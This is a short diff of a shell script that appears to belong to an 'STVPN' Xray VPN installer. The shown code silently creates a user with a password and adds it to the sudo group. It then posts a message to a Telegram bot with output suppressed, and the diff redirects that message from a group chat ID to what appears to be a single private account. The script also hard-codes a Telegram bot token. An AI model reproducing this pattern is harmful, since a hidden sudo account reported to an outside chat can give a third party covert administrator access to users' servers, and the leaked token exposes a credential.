@@ -1052,7 +1052,7 @@ domain=$(cat /etc/xray/domain)
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="-1001901358592"
+    CHATID="6050202923"
     KEY="6094210408:AAHx2ZMJ8PbcR4SjKvH1n-qDEGm0HoiAIWY"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
@@ -1068,7 +1068,7 @@ domain=$(cat /etc/xray/domain)
     ◇━━━━━━━━━━━━━━━━━━━━━━━◇
     ⚠︎𝘽𝙮 STVPN 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎
     ◇━━━━━━━━━━━━━━━━━━━━━━━◇
-"
+"'&reply_markup={"inline_keyboard":[[{"text":"🔥ʟɪsᴛ ᴏʀᴅᴇʀ","url":"https://t.me/casperinject/355"},{"text":"⚡ᴏʀᴅᴇʀ sᴄʀɪᴘᴛ","url":"https://t.me/mzx45"}]]}'
 
    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
